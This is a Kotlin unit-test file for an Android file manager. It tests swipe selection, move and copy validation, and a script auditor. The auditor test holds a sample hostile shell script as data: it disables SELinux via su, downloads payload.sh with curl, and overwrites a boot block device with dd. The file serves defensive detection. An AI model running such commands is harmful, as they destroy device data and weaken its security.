/*
 * Copyright (c) 2026 OpenManager
 * All Rights Reserved.
 */

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class SelectionCopyMoveLogicTest {

    data class MockFileItem(val path: String, val isDirectory: Boolean = false, val isParent: Boolean = false)

    // Simulates the selection manager logic
    class MockSelectionManager(val items: List<MockFileItem>) {
        val selected = mutableSetOf<MockFileItem>()
        var anchorPosition: Int = -1

        fun handleSwipe(position: Int) {
            val item = items.getOrNull(position) ?: return
            if (item.isParent) return

            if (item in selected) {
                // Swiping an already selected file always toggles/deselects it
                selected.remove(item)
                if (anchorPosition == position) {
                    val remaining = selected.firstOrNull()
                    anchorPosition = if (remaining != null) items.indexOf(remaining) else -1
                }
            } else {
                if (selected.isNotEmpty() && anchorPosition >= 0 && anchorPosition != position) {
                    // Range selection between anchor and position
                    val start = minOf(anchorPosition, position)
                    val end = maxOf(anchorPosition, position)
                    for (i in start..end) {
                        val it = items[i]
                        if (!it.isParent) {
                            selected.add(it)
                        }
                    }
                    anchorPosition = position
                } else {
                    // Single item selection
                    selected.add(item)
                    anchorPosition = position
                }
            }
        }
    }

    @Test
    fun testSwipeTogglesAlreadySelectedItemWhenMultipleSelected() {
        val items = listOf(
            MockFileItem("/sdcard/..", isParent = true),
            MockFileItem("/sdcard/file1.txt"),
            MockFileItem("/sdcard/file2.txt"),
            MockFileItem("/sdcard/file3.txt"),
            MockFileItem("/sdcard/file4.txt")
        )
        val manager = MockSelectionManager(items)

        // Select file1 (index 1)
        manager.handleSwipe(1)
        assertEquals(1, manager.selected.size)
        assertEquals(1, manager.anchorPosition)

        // Range swipe to file3 (index 3) -> files 1, 2, 3 selected
        manager.handleSwipe(3)
        assertEquals(3, manager.selected.size)
        assertTrue(manager.selected.contains(items[1]))
        assertTrue(manager.selected.contains(items[2]))
        assertTrue(manager.selected.contains(items[3]))
        assertEquals(3, manager.anchorPosition)

        // Now swipe file2 (index 2) which is already selected -> MUST DESELECT file2!
        manager.handleSwipe(2)
        assertEquals(2, manager.selected.size)
        assertTrue(manager.selected.contains(items[1]))
        assertFalse(manager.selected.contains(items[2]))
        assertTrue(manager.selected.contains(items[3]))

        // Now swipe file3 (which is anchor) -> MUST DESELECT file3 and update anchor!
        manager.handleSwipe(3)
        assertEquals(1, manager.selected.size)
        assertTrue(manager.selected.contains(items[1]))
        assertFalse(manager.selected.contains(items[3]))
        assertEquals(1, manager.anchorPosition)

        // Deselect the last file
        manager.handleSwipe(1)
        assertTrue(manager.selected.isEmpty())
        assertEquals(-1, manager.anchorPosition)
    }

    @Test
    fun testSelfMoveSameDirectoryValidation() {
        fun validateMove(currentDir: String, targetDir: String, sources: List<MockFileItem>): Pair<Boolean, String?> {
            val validSources = sources.filterNot { it.isParent }
            if (validSources.isEmpty()) return false to "No files"
            if (currentDir == targetDir) {
                return false to "El origen y el destino son el mismo directorio"
            }
            for (item in validSources) {
                if (item.isDirectory && (targetDir == item.path || targetDir.startsWith(item.path + "/"))) {
                    return false to "No se puede mover la carpeta dentro de sí misma o de sus subcarpetas"
                }
            }
            return true to null
        }

        val file1 = MockFileItem("/sdcard/Download/file.zip")
        val folder1 = MockFileItem("/sdcard/Download/MyFolder", isDirectory = true)

        // Case 1: Same directory move -> BLOCKED
        val (ok1, err1) = validateMove("/sdcard/Download", "/sdcard/Download", listOf(file1))
        assertFalse(ok1)
        assertEquals("El origen y el destino son el mismo directorio", err1)

        // Case 2: Moving directory into its own subfolder -> BLOCKED
        val (ok2, err2) = validateMove("/sdcard/Download", "/sdcard/Download/MyFolder/Sub1", listOf(folder1))
        assertFalse(ok2)
        assertEquals("No se puede mover la carpeta dentro de sí misma o de sus subcarpetas", err2)

        // Case 3: Moving directory into itself -> BLOCKED
        val (ok3, err3) = validateMove("/sdcard/Download", "/sdcard/Download/MyFolder", listOf(folder1))
        assertFalse(ok3)
        assertEquals("No se puede mover la carpeta dentro de sí misma o de sus subcarpetas", err3)

        // Case 4: Moving into another independent directory -> ALLOWED
        val (ok4, err4) = validateMove("/sdcard/Download", "/sdcard/Music", listOf(file1, folder1))
        assertTrue(ok4)
        assertEquals(null, err4)
    }

    @Test
    fun testCopyDirectoryIntoDescendantValidation() {
        fun validateCopy(targetDir: String, sources: List<MockFileItem>): Pair<Boolean, String?> {
            val validSources = sources.filterNot { it.isParent }
            if (validSources.isEmpty()) return false to "No files"
            for (item in validSources) {
                if (item.isDirectory && (targetDir == item.path || targetDir.startsWith(item.path + "/"))) {
                    return false to "No se puede copiar la carpeta dentro de sí misma o de sus subcarpetas"
                }
            }
            return true to null
        }

        val folder1 = MockFileItem("/sdcard/Project", isDirectory = true)

        // Copy into subfolder -> BLOCKED
        val (ok1, err1) = validateCopy("/sdcard/Project/build/outputs", listOf(folder1))
        assertFalse(ok1)
        assertEquals("No se puede copiar la carpeta dentro de sí misma o de sus subcarpetas", err1)

        // Copy into another location -> ALLOWED
        val (ok2, err2) = validateCopy("/sdcard/Backup", listOf(folder1))
        assertTrue(ok2)
        assertEquals(null, err2)
    }

    @Test
    fun testScriptAuditDetectsDangerousCommandsAndDeletions() {
        val dangerousScript = """
            #!/system/bin/sh
            echo "Starting test..."
            su -c "setenforce 0"
            curl -O https://example.com/payload.sh
            rm /storage/emulated/0/Music/prueba_openmanager.txt
            rmdir /sdcard/temp
            dd if=/dev/zero of=/dev/block/bootdevice
            echo "Done"
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(dangerousScript)
        assertTrue(report.totalFindings > 0)
        assertTrue(report.deletions.isNotEmpty())
        assertTrue(report.rootCalls.isNotEmpty())
        assertTrue(report.networkCalls.isNotEmpty())
        assertTrue(report.systemPaths.isNotEmpty())

        // Verify specific detections
        assertTrue(report.deletions.any { it.contains("rm /storage/emulated/0/Music/prueba_openmanager.txt") })
        assertTrue(report.deletions.any { it.contains("rmdir") })
        assertTrue(report.deletions.any { it.contains("dd if=") })
        assertTrue(report.rootCalls.any { it.contains("su -c") })
        assertTrue(report.networkCalls.any { it.contains("curl") })
        assertTrue(report.systemPaths.any { it.contains("/dev/block") })
    }

    @Test
    fun testScriptAuditCleanScriptReportsZeroFindings() {
        val safeScript = """
            #!/system/bin/sh
            # This is a safe script that just echos info
            echo "Hello Android!"
            date
            uname -a
            ls -la
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(safeScript)
        assertEquals(0, report.totalFindings)
        assertTrue(report.deletions.isEmpty())
        assertTrue(report.rootCalls.isEmpty())
        assertTrue(report.networkCalls.isEmpty())
        assertTrue(report.systemPaths.isEmpty())
    }
}
